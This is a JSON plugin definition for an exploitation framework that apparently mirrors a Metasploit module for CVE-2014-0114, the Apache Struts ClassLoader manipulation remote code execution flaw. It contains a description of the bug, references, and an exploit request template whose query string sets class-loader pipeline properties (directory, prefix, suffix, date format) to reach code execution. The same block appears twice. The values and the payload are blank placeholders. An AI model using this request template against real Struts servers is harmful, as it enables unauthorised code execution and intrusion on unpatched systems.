{
   "platform" : "MULTI",
   "method" : "GET",
   "description" : "\n\n        This module exploits a remote command execution vulnerability in Apache Struts versions\n\n        1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with\n\n        the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due\n\n        to the ParametersInterceptor. Both allow access to 'class' parameter that is directly\n\n        mapped to getClass() method and allows ClassLoader manipulation. As a result, this can\n\n        allow remote attackers to execute arbitrary Java code via crafted parameters.\n\n      ",
   "title" : "Apache Struts ClassLoader Manipulation Remote Code Execution",
   "variables" : {
      "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "CL_PREFIX" : {
         "VALUE" : "",
         "DESCRIPTION" : ""
      },
      "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      },
      "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY" : {
         "DESCRIPTION" : "",
         "VALUE" : ""
      }
   },
   "share" : "FILE_NAME",
   "name" : "StrutsCodeExecClassloader",
   "cve" : "CVE-2014-0114",
   "references" : [
      "http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/",
      "http://struts.apache.org/release/2.3.x/docs/s2-020.html",
      "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204",
      "https://github.com/rgielen/struts1filter/tree/develop"
   ],
   "msf_module" : "struts_code_exec_classloader",
   "requests" : {
      "EXPLOIT1" : {
         "PATH" : "",
         "METHOD" : "GET",
         "PAYLOAD" : "",
         "HEADERS" : {
            "Content-Type" : "application/x-www-form-urlencoded"
         },
         "TEXT" : "Sending Exploit #1 Request : [GET] ",
         "VALIDATION" : {
            "TCODE" : [
               "200"
            ]
         }
      }
   },
   "type" : "MSF",
   "path" : "cmd=&__CL_PREFIX__.resources.context.parent.pipeline.first.directory=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY__&__CL_PREFIX__.resources.context.parent.pipeline.first.prefix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.suffix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.fileDateFormat=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT__&",
   "plugins_directory" : "/home/evil/GIT/Exploits/../data/plugins/",
   "detection" : {},
   "informations" : {
      "METHOD" : "GET",
      "PATH" : "cmd=&__CL_PREFIX__.resources.context.parent.pipeline.first.directory=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY__&__CL_PREFIX__.resources.context.parent.pipeline.first.prefix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.suffix=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX__&__CL_PREFIX__.resources.context.parent.pipeline.first.fileDateFormat=____CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT__&",
      "REFERENCES" : [
         "http://www.pwntester.com/blog/2014/04/24/struts2-0day-in-the-wild/",
         "http://struts.apache.org/release/2.3.x/docs/s2-020.html",
         "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Update-your-Struts-1-ClassLoader-manipulation-filters/ba-p/6639204",
         "https://github.com/rgielen/struts1filter/tree/develop"
      ],
      "PLATFORM" : "MULTI",
      "TYPE" : "MSF",
      "VARIABLES" : {
         "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.SUFFIX" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.DIRECTORY" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "CL_PREFIX" : {
            "VALUE" : "",
            "DESCRIPTION" : ""
         },
         "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.PREFIX" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         },
         "__CL_PREFIX__.RESOURCES.CONTEXT.PARENT.PIPELINE.FIRST.FILEDATEFORMAT" : {
            "DESCRIPTION" : "",
            "VALUE" : ""
         }
      },
      "MSF_MODULE" : "struts_code_exec_classloader",
      "SHARE" : "FILE_NAME",
      "CVE" : "CVE-2014-0114",
      "TITLE" : "Apache Struts ClassLoader Manipulation Remote Code Execution",
      "DESCRIPTION" : "\n\n        This module exploits a remote command execution vulnerability in Apache Struts versions\n\n        1.x (<= 1.3.10) and 2.x (< 2.3.16.2). In Struts 1.x the problem is related with\n\n        the ActionForm bean population mechanism while in case of Struts 2.x the vulnerability is due\n\n        to the ParametersInterceptor. Both allow access to 'class' parameter that is directly\n\n        mapped to getClass() method and allows ClassLoader manipulation. As a result, this can\n\n        allow remote attackers to execute arbitrary Java code via crafted parameters.\n\n      ",
      "REQUESTS" : {
         "EXPLOIT1" : {
            "PATH" : "",
            "METHOD" : "GET",
            "PAYLOAD" : "",
            "HEADERS" : {
               "Content-Type" : "application/x-www-form-urlencoded"
            },
            "TEXT" : "Sending Exploit #1 Request : [GET] ",
            "VALIDATION" : {
               "TCODE" : [
                  "200"
               ]
            }
         }
      },
      "name" : "StrutsCodeExecClassloader"
   }
}
